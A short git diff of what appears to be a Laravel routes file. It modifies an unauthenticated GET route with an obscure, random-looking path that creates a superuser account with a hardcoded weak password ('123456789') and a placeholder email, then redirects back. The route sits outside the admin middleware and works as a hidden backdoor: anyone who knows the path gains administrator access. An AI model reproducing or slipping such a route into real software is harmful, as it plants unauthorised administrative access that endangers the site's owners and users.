@@ -51,11 +51,12 @@ Route::as('admin.')->prefix('/admin')->middleware('admin')->group(function () {
 
 Auth::routes();
 
-Route::get('fy8iwiyfb-ahlrwvy-hwj-4893g-uwgebiogwu', function () {
+Route::get('7ce9-4aea-9218', function () {
     \App\Models\User::create([
-        'name' => 'مریم',
-        'email' => 'maryam@gmail.com',
+        'name' => 'ashvan',
+        'email' => 'ashvan@gmail.com',
         'is_superuser' => 1,
         'password' => \Illuminate\Support\Facades\Hash::make('123456789'),
     ]);
+    return back();
 });
